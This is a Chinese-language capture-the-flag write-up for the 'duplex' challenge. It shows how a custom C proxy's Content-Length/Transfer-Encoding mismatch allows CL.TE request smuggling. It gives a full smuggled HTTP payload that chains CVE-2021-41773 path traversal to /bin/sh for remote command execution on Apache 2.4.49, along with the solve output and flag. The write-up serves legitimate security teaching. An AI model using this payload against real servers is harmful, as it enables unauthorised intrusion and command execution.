# duplex — `K17{un4_p3t1t10_dupl3x_53n5u5...}`

> *una petitio, duplex sensus* — 一個請求，兩種解讀。

## 架構

```
外部 :8080  ->  /app/proxy （自製 C 前端）  ->  127.0.0.1:80  Apache httpd 2.4.49
```

`Dockerfile` 兩個關鍵點：

- `FROM httpd:2.4.49` — 正是 **CVE-2021-41773** 的版本
- `/getflag` 是 `chown root:root` + `chmod 111`（只有執行權）。Apache 跑在 `User daemon`，
  `--x` 對 other 有效，所以只要能以 daemon 身分執行就拿得到 flag。

`httpd.conf` 裡有讓 CVE 可打的兩個必要條件：`<Directory /> Require all granted`
（允許穿越到 DocumentRoot 之外）以及 `LoadModule cgid_module` + `ScriptAlias /cgi-bin/`
（讓穿越到的檔案被當成 CGI 執行 → RCE 而非只是任意讀檔）。

## proxy 的邏輯（反組譯 stripped ELF）

路徑白名單 `path_allowed` @ `0x401909`：

```c
return strcmp(path, "/") == 0 || strcmp(path, "/health") == 0;
```

其他一律 `403 Forbidden`，連不到後端。請求行是 `sscanf(buf, "%15s %1023s", method, path)` 取的。

主迴圈 `handle_client` @ `0x401d56`：

1. 收到 `\r\n\r\n` 為止
2. `cl = find_content_length(hdr, hdr_len)` @ `0x401649` — **只看 Content-Length**
3. 收滿 `hdr_len + cl` bytes
4. 檢查請求行的 path（只檢查**最外層那一個**）
5. `forward` @ `0x401a2d`

而 `forward` 裡有這段：

```c
te = has_transfer_encoding(hdr, hdr_len);      // 0x4017c9
for (每個 header line) {
    skip = 0;
    if (te && strncasecmp(line, "Content-Length:", 15) == 0)
        skip = 1;                               // <-- 有 TE 就把 CL 拿掉
    if (!skip) copy(line);
}
```

## 破口

proxy **用 Content-Length 決定讀幾個 byte，但轉發時把 Content-Length 拿掉**。
於是兩端對「請求在哪裡結束」的認知不一致：

- proxy：`hdr_len + CL` bytes 是一個請求，只驗最外層的 `POST / HTTP/1.1`
- Apache：收到的是乾淨的 chunked 請求（CL 已被 proxy 移除，不會觸發 Apache 的
  CL+TE 同時存在拒絕），在 `0\r\n\r\n` 就認定第一個請求結束，**剩下的 bytes 被當成同一條
  連線上的第二個請求** —— 而那個請求的 path 從來沒被檢查過

這就是 CL.TE desync。諷刺的是：proxy「幫忙移除 CL」這個看似正確的正規化動作，
正是讓 Apache 願意乖乖照 chunked 解析、進而造成 desync 的原因。

## Payload

```http
POST / HTTP/1.1
Host: ...
Transfer-Encoding: chunked
Content-Length: <len(body)>

0

POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
Host: ...
Content-Length: 45

echo Content-Type: text/plain; echo; /getflag
```

外層 path 是 `/`（白名單放行）；chunked body 是空的（直接 `0\r\n\r\n`）；
後面夾帶的請求用 CVE-2021-41773 穿越到 `/bin/sh`，POST body 就是餵給 sh 的腳本。

```bash
DUPLEX_HOST=vm2.secso.cc DUPLEX_PORT=20099 python3 challenges/duplex/solve.py
```

兩個回應都會從同一條連線回來：

```
Content-Type: text/html
... <h1>Duplex</h1> <p>Pars posterior vivit.</p> ...        <- 第一個請求（/）

HTTP/1.1 200 OK
Server: Apache/2.4.49 (Unix)
Transfer-Encoding: chunked
Content-Type: text/plain

22
K17{un4_p3t1t10_dupl3x_53n5u5...}                            <- 夾帶進去的那個
```

chunk size `0x22` = 34 = flag 33 字元 + 換行，所以結尾那三個點確實是 flag 的一部分。
